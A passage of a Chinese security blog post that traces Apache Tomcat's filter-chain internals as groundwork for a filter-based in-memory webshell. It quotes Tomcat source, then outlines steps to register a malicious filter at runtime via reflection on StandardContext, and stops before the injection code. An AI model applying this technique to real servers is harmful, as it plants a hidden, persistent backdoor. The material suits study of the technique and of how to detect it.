+<p>我们查找用法，其中写入值的方法只有<code>ApplicationFilterChain</code>的<code>addFilter</code>方法中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739974979952-7621ab1b-ae28-422f-b56e-2383039abd99.png"></p>
+<p>而addFilter所调用的地方也只有<code>ApplicationFilterFactory</code>中<code>createFilterChain</code>的两个位置，剩下的调用会在后面与这里呼应</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739975105993-2fd6a174-e712-4a6f-8c93-f10276349fbb.png"></p>
+</blockquote>
+<p>现在pos是1，所以目前得到的filter是tomcat的filter，下面执行<code>filter.doFilter(request, response, this);</code>（这里我的IDEA无法走入WsFilter的doFilter方法QAQ）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739973063712-75d8dbd2-840b-4511-8723-5c39536be414.png"></p>
+<p> <code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;chain.doFilter()&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">，会回到 </font><code>ApplicationFilterChain</code><font style="color:rgb(80, 80, 92);"> 类的 DoFilter() 方法里面</font></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739973469688-422a88fc-fcad-42a8-8f4a-e55a59abcd7e.png"></p>
+<ul>
+<li>这里理解一下，我们是filterchain，因此需要一个一个获取filter，直到获取到最后一个，很正常的一个链式调用</li>
+</ul>
+<p>当pos &gt; n时，就会跳出if中，经过中间一些判断，最后走到<code>servlet.service(request, response);</code></p>
+<h3 id="SZLEc">访问/filter前</h3>
+我们想要实现filter内存马，就要明白filter是如何被创建并注册的（调用流程如下）
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739974131159-d7c2321f-3fbd-476e-8f88-3ba2bc9427d4.png"></p>
+<p>我们选到<code>StandardWrapperValve</code>的<code>invoke</code>方法中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        </span><br><span class="line">        ......</span><br><span class="line">        </span><br><span class="line">        <span class="type">MessageBytes</span> <span class="variable">requestPathMB</span> <span class="operator">=</span> request.getRequestPathMB();</span><br><span class="line">        <span class="type">DispatcherType</span> <span class="variable">dispatcherType</span> <span class="operator">=</span> DispatcherType.REQUEST;</span><br><span class="line">        <span class="keyword">if</span> (request.getDispatcherType()==DispatcherType.ASYNC) &#123;</span><br><span class="line">            dispatcherType = DispatcherType.ASYNC;</span><br><span class="line">        &#125;</span><br><span class="line">        request.setAttribute(Globals.DISPATCHER_TYPE_ATTR,dispatcherType);</span><br><span class="line">        request.setAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR,</span><br><span class="line">                requestPathMB);</span><br><span class="line">        <span class="comment">// Create the filter chain for this request</span></span><br><span class="line">        <span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span></span><br><span class="line">                ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Call the filter chain for this request</span></span><br><span class="line">        <span class="comment">// <span class="doctag">NOTE:</span> This also calls the servlet&#x27;s service() method</span></span><br><span class="line">        <span class="type">Container</span> <span class="variable">container</span> <span class="operator">=</span> <span class="built_in">this</span>.container;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ((servlet != <span class="literal">null</span>) &amp;&amp; (filterChain != <span class="literal">null</span>)) &#123;</span><br><span class="line">                <span class="comment">// Swallow output if needed</span></span><br><span class="line">                <span class="keyword">if</span> (context.getSwallowOutput()) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        SystemLogHandler.startCapture();</span><br><span class="line">                        <span class="keyword">if</span> (request.isAsyncDispatching()) &#123;</span><br><span class="line">                            request.getAsyncContextInternal().doInternalDispatch();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            filterChain.doFilter(request.getRequest(),</span><br><span class="line">                                    response.getResponse());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">log</span> <span class="operator">=</span> SystemLogHandler.stopCapture();</span><br><span class="line">                        <span class="keyword">if</span> (log != <span class="literal">null</span> &amp;&amp; log.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            context.getLogger().info(log);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (request.isAsyncDispatching()) &#123;</span><br><span class="line">                        request.getAsyncContextInternal().doInternalDispatch();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        filterChain.doFilter</span><br><span class="line">                            (request.getRequest(), response.getResponse());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中存在一个<code>createFilterChain</code>方法，会构建一个filterchain，方法代码如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title function_">createFilterChain</span><span class="params">(ServletRequest request,</span></span><br><span class="line"><span class="params">            Wrapper wrapper, Servlet servlet)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there is no servlet to execute, return null</span></span><br><span class="line">        <span class="keyword">if</span> (servlet == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create and initialize a filter chain object</span></span><br><span class="line">        <span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (request <span class="keyword">instanceof</span> Request) &#123;</span><br><span class="line">            <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) request;</span><br><span class="line">            <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">                <span class="comment">// Security: Do not recycle</span></span><br><span class="line">                filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                filterChain = (ApplicationFilterChain) req.getFilterChain();</span><br><span class="line">                <span class="keyword">if</span> (filterChain == <span class="literal">null</span>) &#123;</span><br><span class="line">                    filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">                    req.setFilterChain(filterChain);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Request dispatcher in use</span></span><br><span class="line">            filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        filterChain.setServlet(servlet);</span><br><span class="line">        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Acquire the filter mappings for this Context</span></span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) wrapper.getParent();</span><br><span class="line">        FilterMap filterMaps[] = context.findFilterMaps();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are no filter mappings, we are done</span></span><br><span class="line">        <span class="keyword">if</span> ((filterMaps == <span class="literal">null</span>) || (filterMaps.length == <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> filterChain;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Acquire the information we will need to match filter mappings</span></span><br><span class="line">        <span class="type">DispatcherType</span> <span class="variable">dispatcher</span> <span class="operator">=</span></span><br><span class="line">                (DispatcherType) request.getAttribute(Globals.DISPATCHER_TYPE_ATTR);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">requestPath</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">attribute</span> <span class="operator">=</span> request.getAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR);</span><br><span class="line">        <span class="keyword">if</span> (attribute != <span class="literal">null</span>)&#123;</span><br><span class="line">            requestPath = attribute.toString();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> wrapper.getName();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Add the relevant path-mapped filters to this filter chain</span></span><br><span class="line">        <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!matchFiltersURL(filterMap, requestPath)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)</span><br><span class="line">                    context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">            <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// FIXME - log configuration problem</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.addFilter(filterConfig);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Add filters that match on servlet name second</span></span><br><span class="line">        <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!matchFiltersServlet(filterMap, servletName)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)</span><br><span class="line">                    context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">            <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// FIXME - log configuration problem</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.addFilter(filterConfig);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Return the completed filter chain</span></span><br><span class="line">        <span class="keyword">return</span> filterChain;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>filterMaps[]</code>属性是从context执行<code>findFilterMaps</code>方法后所返回的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> FilterMap[] findFilterMaps() &#123;</span><br><span class="line">    <span class="keyword">return</span> filterMaps.asArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740022403092-db28fc42-94a7-4919-9ec1-a405edd7079d.png"></p>
+<p>其中<code>filterChain.addFilter(filterConfig);</code>会将filter加入到filterChain中</p>
+<p>要想执行到<code>filterChain.addFilter(filterConfig);</code>，我们需要保证filterMaps与filterConfig不为空</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((filterMaps == <span class="literal">null</span>) || (filterMaps.length == <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> filterChain;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!matchFiltersURL(filterMap, requestPath)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)</span><br><span class="line">                    context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">            <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// FIXME - log configuration problem</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.addFilter(filterConfig);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="obF3g">小结流程</h3>
+<h4 id="Bwlh4">执行invoke方法</h4>
+层层调用invoke，对filterChain执行addFilter方法，构造好filterChain
+
+<h4 id="SH7Hi">拿出filterchain</h4>
+进行`dofilter`工作，对filterchain中的filter一个一个进行链式调用
+
+<h4 id="WnYOh">最后一个filter</h4>
+在最后一个filter执行完`doFilter`方法后，跳到`<font style="color:rgb(83, 83, 96);background-color:rgb(242, 242, 242);">Servlet.service()</font>`
+
+<h4 id="qrB6I">攻击思路</h4>
+我们的攻击代码，应该在`StandardContext#findFilterConfig`中生效，从filterConfigs获取filter，可以保证我们的每次请求都会触发恶意filter，若在其他位置加入filter，可能只会在本次请求中触发恶意filter
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> FilterConfig <span class="title function_">findFilterConfig</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> filterConfigs.get(name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(80, 80, 92);">我们只需要构造含有恶意的 filter 的</font><font style="color:rgb(80, 80, 92);"> </font><strong>filterConfig</strong><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">和拦截器</font><font style="color:rgb(80, 80, 92);"> </font><strong>filterMaps</strong><font style="color:rgb(80, 80, 92);">，就可以达到触发目的了，并且它们都是从 StandardContext 中来的。</font></p>
+<p><font style="color:rgb(80, 80, 92);">而这个 filterMaps 中的数据对应 web.xml 中的 filter-mapping 标签</font></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;  </span><br><span class="line">&lt;web-app xmlns=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span>  </span><br><span class="line"> xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>  </span><br><span class="line"> xsi:schemaLocation=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span>  </span><br><span class="line"> version=<span class="string">&quot;4.0&quot;</span>&gt;  </span><br><span class="line"> &lt;filter&gt; &lt;filter-name&gt;filter&lt;/filter-name&gt;  </span><br><span class="line"> &lt;filter-class&gt;filter&lt;/filter-class&gt;  </span><br><span class="line"> &lt;/filter&gt;  </span><br><span class="line"> &lt;filter-mapping&gt; &lt;filter-name&gt;filter&lt;/filter-name&gt;  </span><br><span class="line"> &lt;url-pattern&gt;/filter&lt;/url-pattern&gt;  </span><br><span class="line"> &lt;/filter-mapping&gt;&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="OnoJl">思路分析</h3>
+`StandardContext`<font style="color:rgb(80, 80, 92);"> 这个类是一个容器类，它负责存储整个 Web 应用程序的数据和对象，并加载了 web.xml 中配置的多个 Servlet、Filter 对象以及它们的映射关系。</font>
+
+<p>在该类中，<font style="color:rgb(80, 80, 92);">有以下三个与filter有关的成员变量</font></p>
+<blockquote>
+<ol>
+<li><font style="color:rgb(80, 80, 92);">filterConfigs 成员变量是一个HashMap对象，里面存储了filter名称与对应的</font><code>ApplicationFilterConfig</code><font style="color:rgb(80, 80, 92);">对象的键值对，在</font><code>ApplicationFilterConfig</code><font style="color:rgb(80, 80, 92);">对象中则存储了Filter实例以及该实例在web.xml中的注册信息。</font></li>
+<li><font style="color:rgb(80, 80, 92);">filterDefs 成员变量成员变量是一个HashMap对象，存储了filter名称与相应</font><code>FilterDef</code><font style="color:rgb(80, 80, 92);">的对象的键值对，而</font><code>FilterDef</code><font style="color:rgb(80, 80, 92);">对象则存储了Filter包括名称、描述、类名、Filter实例在内等与filter自身相关的数据</font></li>
+<li><font style="color:rgb(80, 80, 92);">filterMaps 中的</font><code>FilterMap</code><font style="color:rgb(80, 80, 92);">则记录了不同filter与</font><code>UrlPattern</code><font style="color:rgb(80, 80, 92);">的映射关系</font></li>
+</ol>
+</blockquote>
+<p>我们需要找到一个方法，去修改<code>filterMaps</code>，它对应的是web.xml中的filter-mapping标签，也就是<strong>路径</strong>与<strong>filter-name</strong>的对应关系</p>
+<ul>
+<li>而我们后面说的<code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;filterDef&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">，对应的就是web.xml中的filter标签，是</font><strong><font style="color:rgb(80, 80, 92);">Filter类</font></strong><font style="color:rgb(80, 80, 92);">与</font><strong><font style="color:rgb(80, 80, 92);">filter-name</font></strong><font style="color:rgb(80, 80, 92);">的对应关系</font></li>
+</ul>
+<p>在<code>StandardContext</code><font style="color:rgb(80, 80, 92);">类中存在两个方法，可以向</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;filterMaps&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">中添加数据</font></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addFilterMap</span><span class="params">(FilterMap filterMap)</span> &#123;</span><br><span class="line">    validateFilterMap(filterMap);</span><br><span class="line">    <span class="comment">// Add this filter mapping to our registered set</span></span><br><span class="line">    filterMaps.add(filterMap);</span><br><span class="line">    fireContainerEvent(<span class="string">&quot;addFilterMap&quot;</span>, filterMap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addFilterMapBefore</span><span class="params">(FilterMap filterMap)</span> &#123;</span><br><span class="line">    validateFilterMap(filterMap);</span><br><span class="line">    <span class="comment">// Add this filter mapping to our registered set</span></span><br><span class="line">    filterMaps.addBefore(filterMap);</span><br><span class="line">    fireContainerEvent(<span class="string">&quot;addFilterMap&quot;</span>, filterMap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修改<code>filterDef</code>，在<code>StandardContext</code><font style="color:rgb(80, 80, 92);">类中存在着方法</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;addFilterDef&lt;/font&gt;</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addFilterDef</span><span class="params">(FilterDef filterDef)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span> (filterDefs) &#123;</span><br><span class="line">            filterDefs.put(filterDef.getFilterName(), filterDef);</span><br><span class="line">        &#125;</span><br><span class="line">        fireContainerEvent(<span class="string">&quot;addFilterDef&quot;</span>, filterDef);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后的<code>filterConfig</code>，在<code>StandardContext</code><font style="color:rgb(80, 80, 92);">类中存在着方法</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;filterStart&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">，该方法中的</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;filterConfigs.put(name, filterConfig);&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">部分完成了</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;filterConfig&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">的添加。在后续实现过程中，可以调用</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;StandardContext#filterStart&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">方法完成添加，也可以直接调用</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;filterConfigs.put(name, filterConfig);&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">，道理都是一样的</font></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">filterStart</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (getLogger().isDebugEnabled()) &#123;</span><br><span class="line">            getLogger().debug(<span class="string">&quot;Starting filters&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Instantiate and record a FilterConfig for each defined filter</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">ok</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">synchronized</span> (filterConfigs) &#123;</span><br><span class="line">            filterConfigs.clear();</span><br><span class="line">            <span class="keyword">for</span> (Entry&lt;String,FilterDef&gt; entry : filterDefs.entrySet()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">                <span class="keyword">if</span> (getLogger().isDebugEnabled()) &#123;</span><br><span class="line">                    getLogger().debug(<span class="string">&quot; Starting filter &#x27;&quot;</span> + name + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span></span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>(<span class="built_in">this</span>, entry.getValue());</span><br><span class="line">                    filterConfigs.put(name, filterConfig);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                    t = ExceptionUtils.unwrapInvocationTargetException(t);</span><br><span class="line">                    ExceptionUtils.handleThrowable(t);</span><br><span class="line">                    getLogger().error(sm.getString(</span><br><span class="line">                            <span class="string">&quot;standardContext.filterStart&quot;</span>, name), t);</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ok;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="AFHVe">实现</h2>
+servlet内存马相似，依旧是写马+动态注册
+
+<h3 id="l8hXT">构造思路</h3>
+<font style="color:rgb(80, 80, 92);">通过前文分析，得出构造的主要思路如下  
+</font><font style="color:rgb(80, 80, 92);">1、获取当前应用的ServletContext对象  
+</font><font style="color:rgb(80, 80, 92);">2、通过ServletContext对象再获取filterConfigs  
+</font><font style="color:rgb(80, 80, 92);">2、接着实现自定义想要注入的filter对象  
+</font><font style="color:rgb(80, 80, 92);">4、然后为自定义对象的filter创建一个FilterDef  
+</font><font style="color:rgb(80, 80, 92);">5、最后把 ServletContext对象、filter对象、FilterDef全部都设置到filterConfigs即可完成内存马的实现</font>
+
+<h3 id="RXwTZ">filter内存马的实现</h3>
+> 这里是实现代码执行，不对内存马的回显进行分析
+>
+
+<p>实现动态注册，首先需要通过反射来获取<code>StandardContext</code>（和servlet内存马一样）</p>
